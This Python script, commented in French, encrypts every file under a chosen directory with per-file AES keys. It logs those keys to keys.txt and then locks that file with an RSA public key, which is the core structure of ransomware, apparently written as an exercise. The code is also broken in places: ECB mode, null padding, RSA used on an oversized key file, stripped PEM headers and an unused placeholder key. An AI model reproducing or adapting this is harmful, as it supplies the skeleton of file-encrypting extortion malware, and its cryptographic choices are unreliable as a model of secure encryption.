from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
import os

def enc_file(file):
    aes_key = get_random_bytes(32)
    with open(file, "rb") as f:
        data = f.read()
    
        # Ajout de padding pour que la taille soit un multiple de 16
        data += b"\0" * (16 - len(data) % 16)

        cipher = AES.new(aes_key, AES.MODE_ECB)
        ciphertext = cipher.encrypt(data)

    enc_file_path = file + ".enc"
    with open(enc_file_path, "wb") as f:
        f.write(ciphertext)

    # Enregistrement de la clé dans keys.txt
    with open("keys.txt", "a") as keys_file:
        keys_file.write(f"{enc_file_path}:{aes_key.hex()}\n")

    print(f"Fichier chiffré : {enc_file_path}")

def search_dir(dir):
    for dirpath, _, filenames in os.walk(dir):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            enc_file(file_path)

def encrypt_keys_file():
    # Chiffrement du fichier keys.txt avec la clé publique
    with open("keys.txt", "rb") as f:
        keys_data = f.read()
    
    clean_public_key("key.public", "key.public-clean")
    
    with open("key.public-clean", "rb") as public_file:
        public_key = public_file.read()

    rsa_key = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(rsa_key)
    encrypted_keys_data = cipher_rsa.encrypt(keys_data)

    with open("keys.txt.enc", "wb") as f:
        f.write(encrypted_keys_data)

    with open("keys.txt.enc", "wb") as f:
        f.write(encrypted_keys_data)

    print("Fichier keys.txt chiffré.")

def clean_public_key(input_file, output_file):
    with open(input_file, 'r') as infile:
        lines = infile.readlines()

    cleaned_lines = [line.strip() for line in lines if not line.startswith("-----")]

    cleaned_key = ''.join(cleaned_lines)

    with open(output_file, 'w') as outfile:
        outfile.write(cleaned_key)

    print(f"Cleaned public key written to {output_file}")
def main():
    directory = input("Entrez le chemin du répertoire à chiffrer : ")
    
    if not os.path.isdir(directory):
        print("Le répertoire spécifié n'existe pas.")
        return

    search_dir(directory)

    public_key = "VOTRE_CLE_PUBLIQUE_Ici" 

    encrypt_keys_file()
    print("Chiffrement terminé.")

if __name__ == "__main__":
    main()